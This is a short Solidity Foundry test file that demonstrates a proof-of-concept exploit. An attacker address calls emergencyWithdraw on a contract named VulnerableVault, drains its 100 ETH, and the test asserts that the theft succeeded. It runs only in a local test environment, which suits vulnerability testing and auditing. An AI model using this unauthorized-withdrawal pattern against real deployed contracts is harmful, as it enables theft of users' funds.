// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract ExploitTest is Test {
    VulnerableVault target;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public {
        // Deploy the vulnerable contract
        target = new VulnerableVault();
        
        // Fund the contract and accounts
        vm.deal(address(target), 100 ether); // Contract has 100 ETH
        vm.deal(attacker, 10 ether); // Attacker has 10 ETH for gas
        vm.deal(victim, 100 ether); // Victim has 100 ETH
    }
    
    function test_UnauthorizedFundWithdrawalViaEmergencyWithdraw() public {
        // Record initial state
        uint256 initialContractBalance = address(target).balance;
        uint256 initialAttackerBalance = attacker.balance;
        
        // Execute exploit
        vm.startPrank(attacker);
        target.emergencyWithdraw(attacker);
        vm.stopPrank();
        
        // Assert exploit success
        assertEq(address(target).balance, 0, "Contract should be drained");
        assertEq(attacker.balance, initialContractBalance + initialAttackerBalance, "Attacker should have stolen all funds");
    }
}
